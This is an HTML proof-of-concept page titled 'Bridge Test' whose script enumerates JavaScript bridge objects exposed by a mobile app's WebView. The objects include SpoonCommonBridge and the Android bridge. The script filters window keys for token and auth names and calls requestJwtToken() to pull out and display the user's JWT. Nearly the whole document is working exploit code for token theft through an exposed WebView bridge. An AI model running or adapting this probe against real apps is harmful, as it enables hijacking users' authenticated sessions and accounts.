<html><head><title>POC</title></head>
<body style="background:#fff;color:#000;font-size:20px;padding:10px;font-family:monospace;">
<h1>Bridge Test</h1>
<div id="s" style="font-size:28px;font-weight:bold;">...</div>
<pre id="r" style="font-size:14px;white-space:pre-wrap;word-break:break-all;"></pre>
<script>
var s=document.getElementById("s"),r=document.getElementById("r"),log=[];
function L(t){log.push(t);r.textContent=log.join("\n");}

// 1. Check specific bridges
var targets=["SpoonCommonBridge","SpoonWebBridge","NativeBridge","Android"];
for(var i=0;i<targets.length;i++){
  try{var o=window[targets[i]];
    if(o){L("FOUND:"+targets[i]+" keys="+Object.keys(o).join(","));}
    else{L(targets[i]+": null");}
  }catch(e){L(targets[i]+":"+e.message);}
}

// 2. List ALL window keys with relevant names
var all=Object.keys(window);
var rel=all.filter(function(k){return /bridge|spoon|native|jwt|token|auth/i.test(k);});
L("--- relevant keys: "+(rel.length?rel.join(", "):"NONE"));

// 3. Try enumerating iframe content
L("--- total window keys: "+all.length);

// 4. Try direct call anyway
try{var t=window.SpoonCommonBridge&&window.SpoonCommonBridge.requestJwtToken&&window.SpoonCommonBridge.requestJwtToken();
if(t){s.textContent="JWT:"+String(t).substring(0,40)+"...";s.style.color="green";L("JWT="+String(t).substring(0,80));}
else{L("requestJwtToken: no return");}
}catch(e){L("call err: "+e.message);}

if(s.textContent==="..."){s.textContent="NO BRIDGE";s.style.color="red";}
</script>
</body>
</html>
